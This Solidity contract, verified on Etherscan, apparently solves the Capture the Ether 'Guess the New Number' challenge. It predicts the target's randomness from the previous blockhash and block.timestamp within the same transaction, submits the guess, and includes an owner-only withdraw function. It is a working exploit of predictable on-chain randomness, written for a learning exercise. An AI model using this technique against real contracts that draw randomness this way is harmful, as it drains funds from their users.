/**
 *Submitted for verification at Etherscan.io on 2022-03-22
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;


interface GuessTheNewNumberChallenge {
  function guess(uint8) external payable;
  function isComplete() external returns (bool);
}

contract GuessTheNewNumberChallengeCall  {
    uint8 public answer;
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "you are not owner!");
        _;
    }
    //function callFuct(address addr) public payable {
    function callFuct(address addr) public payable {
        answer = get_guess();
        //GuessTheNewNumberChallenge(addr).guess{value: msg.value}(answer);
        GuessTheNewNumberChallenge _interface = GuessTheNewNumberChallenge(addr);
        _interface.guess{value: msg.value}(answer);
        //uint8 a = _interface.getnum(answer);
        //return a;
    }

    function get_guess() public view returns (uint8) {
        //uint8 answer = uint8(keccak256(blockhash(block.number - 1), block.timestamp)); 
        uint8 an = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));     
        return an;
    }

    function withdraw(address payable _to) public payable onlyOwner {
        _to.transfer(address(this).balance);
    }

}